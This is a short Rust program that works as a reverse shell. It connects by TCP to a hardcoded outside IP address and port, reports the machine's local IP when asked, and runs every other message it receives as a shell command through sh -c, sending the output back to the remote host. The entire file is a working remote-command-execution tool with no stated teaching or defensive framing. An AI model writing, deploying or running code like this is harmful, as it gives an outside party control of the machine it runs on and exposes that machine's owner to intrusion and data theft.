use std::net::{TcpStream, Shutdown};
use std::io::Write;
use std::io::Read;
use std::process::Command;
use local_ip_address::local_ip;

fn main() {
    let mut stream = TcpStream::connect("129.21.49.57:5678").unwrap(); //connects via TCP
    let mut i = 0; 
    while i < 15{
        let mut buffer = [0;1024]; //set the buffer
        stream.read(&mut buffer).unwrap(); //read the buffer
        let recv = std::str::from_utf8(&buffer).unwrap(); //string of recv
        println!("Received: {}",&recv); //print that shit
        if recv == "getIP" { //if it's getIP, return the IP
            let localIP = local_ip().unwrap();
            stream.write(&localIP.as_bytes()).unwrap(); //send it
            println!("Sent: {}",&localIP); //print it
        } else {
            println!("Out: {}",&recv);
            // stream.write(&out.as_bytes()).unwrap();
            // println!("Sent: {}",&out);
            let mut output = Command::new("sh").arg("-c").arg(&recv.trim_matches(char::from(0))).output().expect("execution failed from the client"); //run this
            let stderrout = format!("{}{}",String::from_utf8_lossy(&output.stdout),String::from_utf8_lossy(&output.stderr));
            // println!("stdout: {}", String::from_utf8_lossy(&output.stdout)); //print stdout
            // println!("stderr: {}", String::from_utf8_lossy(&output.stderr)); //print stderr
            println!("Output: {}",stderrout);
            stream.write(&stderrout.as_bytes()).unwrap(); //send that shit
        };
        i+=1;
    }
    stream.shutdown(Shutdown::Both).expect("shutdown call failed");
}